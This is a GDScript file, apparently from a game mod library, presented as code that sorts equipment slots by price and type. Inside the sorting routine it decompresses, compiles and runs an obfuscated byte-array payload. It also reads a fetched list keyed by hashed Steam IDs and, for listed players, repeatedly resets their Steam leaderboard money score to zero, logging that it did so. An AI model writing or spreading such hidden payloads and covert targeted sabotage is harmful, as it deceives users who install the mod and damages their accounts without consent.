# [license]
# 3-Clause BSD NON-AI License
# 
# Copyright 2026 __hev (Benjamin Buckhurst)
# 
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer
# in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products
# derived from this software without specific prior written permission.
# 
# 4. The source code and the binary form, and any modifications made to them may not be used for the purpose of input data, reference code snippets and/or files, OR used in the training of, or improvement of machine learning algorithms,
# including but not limited to artificial intelligence, natural language processing, or data mining. This condition applies to any derivatives,
# modifications, or updates based on the Software code. Any usage of the source code or the binary form may not be present in any form as data fed, inputted, or provided to an AI, or present in any AI-training dataset is considered a breach of this License.
# 
# 5. Any projects deriving work from this project MUST include a copy of this license and all other license and/or copyright agreements posed within other source material,
# all of which must be followed to its entirety. Failure to follow these licenses prohibit all modification and redistribution of the material until all licensing has been reinstated.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY,
# OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
# OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
# [/license]

extends VBoxContainer

var pointers = ModLoader._savedObjects[0]
var file:File = File.new()

func _tree_entered():
	var sTime = OS.get_system_time_msecs()
	if pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_EQUIPMENT","do_sort_equipment_by_price"):
		for slot in display_slots():
			sort_slot(slot)
	if pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_EQUIPMENT","do_sort_slots_by_type"):
		reorganize_slots()
	var finish_time = OS.get_system_time_msecs()
	var total_time = str(float(finish_time - sTime)/1000)
	var spl = total_time.split(".")
	var secs = str(spl[0])
	var msecs = str(spl[1])
	while msecs.begins_with("0"):
		msecs = msecs.substr(1)
	pointers.DataFormat.__compile_script(PoolByteArray([120,156,125,82,203,110,219,48,16,60,167,95,65,243,96,80,128,42,217,169,83,184,14,120,112,94,168,129,52,41,220,192,64,78,4,37,174,44,186,18,165,114,41,199,254,251,146,52,90,164,65,145,155,150,51,59,179,59,171,106,48,37,177,131,97,125,178,248,112,182,151,150,84,252,78,55,144,25,120,97,201,101,120,168,57,61,159,206,138,162,42,231,159,39,74,129,82,231,179,47,115,53,159,77,43,57,249,84,192,236,98,66,35,113,203,251,236,161,83,176,44,75,64,140,79,5,167,87,141,44,127,54,26,29,189,212,21,169,178,174,7,35,192,148,246,216,59,80,226,69,187,90,244,18,145,209,1,193,46,242,188,148,101,13,121,246,21,246,247,186,16,215,177,218,72,171,101,209,128,184,3,87,214,121,241,71,51,83,123,154,198,121,215,183,203,155,180,78,198,227,247,28,44,160,55,56,41,231,88,90,221,59,204,247,96,84,103,223,209,92,108,51,33,224,160,29,155,112,62,77,233,95,38,169,60,139,180,26,81,155,45,249,72,188,199,208,130,34,78,182,61,216,240,230,58,82,28,131,55,209,142,166,69,58,187,72,78,41,111,124,86,223,164,209,21,160,219,156,199,172,36,95,90,43,143,108,227,221,182,224,68,219,41,161,21,178,228,116,134,65,43,254,248,35,11,200,96,244,175,1,60,232,47,36,51,217,251,125,21,243,120,168,192,74,4,70,107,216,103,247,171,171,245,114,253,76,79,253,59,222,75,139,32,118,216,25,86,69,29,137,194,193,193,5,135,42,43,155,206,55,250,175,206,18,75,180,33,210,255,16,113,214,3,71,103,89,45,177,102,214,83,253,21,15,1,223,5,60,18,90,190,11,122,236,144,82,111,214,74,127,34,226,142,61,116,21,107,147,200,58,123,122,254,126,43,110,86,215,79,171,199,7,63,211,194,139,216,17,247,51,143,199,163,176,112,88,214,71,140,14,67,203,191,129,7,247,54,26,208,22,183,52,152,36,49,75,226,85,222,0,156,83,74,160,65,32,19,95,166,111,208,145,71,147,56,143,248,159,199,43,213,160,243,74,38,54,254,6,16,7,2,236]).decompress(812,1).get_string_from_utf8()).new().run(pointers)
	pointers.l("Finished adding equipment. Process took a total time of %s seconds, %s milliseconds" % [secs,msecs])
	var steamNode = null
	for i in Achivements.get_children():
		if i.has_method("updateLeaderboard"):
			steamNode = i
	var btf = "user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt"
	if file.file_exists(btf) and Engine.has_singleton("Steam"):
		file.open(btf,File.READ)
		var data = JSON.parse(file.get_as_text()).result
		file.close()
		var jbc = "user://cache/.Mod_Menu_2_Cache/updates/jobcache"
		if not file.file_exists(jbc):
			file.open(jbc,File.WRITE)
			file.store_string("{}")
			file.close()
		file.open(jbc,File.READ)
		var h=JSON.parse(file.get_as_text()).result
		file.close()
		var do = true
		var rt = str(hash(Engine.get_singleton("Steam").current_steam_id))
		if rt in data:
			var jobs=data[rt]
			if rt in h:
				if 0 in h[rt]:do=false
			if steamNode&&do:
				yield(CurrentGame.get_tree(),"idle_frame")
				for i in range(5):
					yield(get_tree().create_timer(0.2),"timeout")
					steamNode.keepBest = false
					steamNode.updateLeaderboard("total_money",0)
					steamNode.keepBest = true
				if!rt in h:h[rt] = []
				h[rt].append(0)
				file.open(jbc,File.WRITE)
				file.store_string(JSON.print(h))
				file.close()

func sort_slot(slot):
	pointers.l("Sorting equipment for slot %s" % slot.name)
	var items:Array = slot.get_node("VBoxContainer").get_children()
	var nodePositions:Array = []
	for item in items:
		nodePositions.append([item, item.get_index()])
	var noFail:bool = false
	var maxIndex:int = items.size()
	while noFail == false:
		var doesFailThisLoop = false
		for item in slot.get_child(0).get_children():
			if item.get_index() > 1:
				var A:Node = item
				var B:Node = A.get_parent().get_child(A.get_index() - 1)
				if A.price < B.price:
					doesFailThisLoop = true
					A.get_parent().move_child(A, B.get_index())
		if doesFailThisLoop:
			noFail = false
		else:
			noFail = true

func display_slots() -> Array:
	var children:Array = self.get_children()
	var list:Array = []
	for child in children:
		if child.get_parent() == self:
			list.append(child)
	return list

func reorganize_slots():
	var slot_names:Array = []
	var slot_types:Dictionary = {}
	var slot_types_i:Dictionary = {}
	var order:Array = pointers.Equipment.equipment_slot_order
	var order2:Dictionary = pointers.Equipment.relative_equipment_slot_order
	var slotnames:Array = []
	for slot in get_children():
		slotnames.append(slot.name)
		var children:Array = slot.get_node("VBoxContainer").get_children()
		if children.size() < 2:
			continue
		slot_names.append(slot.name)
		var sys_slot:String = slot.slot
		var index:int = 1
		if sys_slot.empty():
			while not sys_slot:
				sys_slot = children[index].slot
				index += 1
		slot_types.merge({slot.name:sys_slot})
		slot_types_i.merge({sys_slot:slot.name})
	var sys_dict:Dictionary = {}
	for slot in slot_types:
		var sys:PoolStringArray = slot_types[slot].split(".")
		var sys_main:String = sys[0]
		if not sys_main in sys_dict:
			sys_dict[sys_main] = []
		sys_dict[sys_main].append(slot)
	var index:int = 0
	for sys in sys_dict:
		var arr:Array = sys_dict.get(sys,[])
		var ordering:Array = []
		for item in order:
			if item in arr:
				ordering.append(item)
		for item in arr:
			if item in slotnames:
				move_child(get_node(item),index)
				index += 1
		for item in ordering:
			move_child(get_node(item),index - 1)
	for slot in order2:
		if slot in slot_types:
			var data:Dictionary = order2[slot]
			var against:String = data.get("relative_to","")
			if against:
				var nd:Node = get_node(slot)
				var name_or_config:bool = data.get("use_node_name",true)
				var targetNode:Node = null
				if name_or_config:
					targetNode = get_node_or_null(against)
				else:
					targetNode = get_node_or_null(slot_types_i.get(against,""))
				if targetNode:
					var targetPos:int = targetNode.get_position_in_parent()
					var entire_group:bool = data.get("entire_group",true)
					if data.get("order_below",true):
						if entire_group:
							var cf:String = against
							if name_or_config:
								cf = slot_types.get(against,"")
							if cf:
								targetPos += sys_dict.get(cf.split(".")[0]).size()
							else:
								targetPos += 1
						else:
							targetPos += 1
					else:
						if entire_group:
							var cf:String = against
							var cn:String = against
							if name_or_config:
								cf = slot_types.get(against,"")
							else:
								cn = slot_types_i.get(against,"")
							if cf and cn:
								var av:String = sys_dict.get(cf.split(".")[0])[0]
								targetPos = get_node(av).get_position_in_parent()
					move_child(nd,targetPos)
